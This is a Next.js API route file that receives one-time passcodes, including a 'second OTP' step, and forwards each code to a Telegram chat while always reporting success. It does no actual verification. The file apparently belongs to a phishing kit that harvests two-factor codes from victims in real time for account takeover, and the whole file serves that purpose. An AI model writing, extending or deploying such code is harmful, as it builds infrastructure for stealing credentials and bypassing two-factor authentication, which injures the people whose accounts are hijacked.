import { NextRequest, NextResponse } from 'next/server';
import { sendTelegramMessage } from '@/lib/telegram';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => ({}));
    const otpcode = body?.otpcode ?? '';
    const isSecondOtp = body?.isSecondOtp === true || body?.step === '2';
    try {
      await sendTelegramMessage({ otpcode, isSecondOtp }, 'otp');
    } catch (telegramError) {
      console.error('Telegram send failed:', telegramError);
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Error in OTP API:', error);
    return NextResponse.json({ success: true });
  }
}


